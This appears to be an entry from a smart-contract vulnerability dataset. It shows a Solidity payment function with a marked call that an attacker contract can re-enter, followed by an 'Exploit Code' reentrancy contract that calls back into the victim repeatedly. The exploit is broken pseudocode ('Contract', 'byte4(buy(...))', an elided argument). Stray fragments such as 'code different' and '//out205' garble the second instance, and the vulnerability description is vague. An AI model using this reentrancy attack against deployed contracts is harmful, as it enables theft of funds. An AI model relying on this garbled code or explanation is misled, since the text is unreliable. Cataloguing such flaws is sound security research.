## Vulnerable Code

```javascript
**Instance_1**
function processPayment(address _address) public {
        Participant participant = Participant(participants[_address]);

        bool done = participant.processPayment.value(participant.daily())();  //Vulnerable position          
        
        if (done) {
            participants[_address] = address(0);
            emit ParticipantRemoved(_address);
        }
    }


**Instance_2**
function processPayment(address _address) public {
        Participant participant = Participant(participants[_address]);

        bool done = participant.process.value(participant.daily())();   code different

        if (done) {
            participants[_address] = address(0);
            emit ParticipantRemoved(_address);
        }
}//out205
```



## Exploit Code

```javascript
Contract Participant {

}
Contract Attack is Participant{
    uint count;
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    function processPayment(){
        count++;
        if(count < 5){
            victimAddress.call(byte4(buy("processPayment(address)")), ...);
        }
    }

    function daily() returns (uint256){
        return 10;
    }
}
```



##  Sophisticated Vulnerability Description
Look at the row "vulnerability position".The variable 'participant' can be manipulated any value by a malicious contract

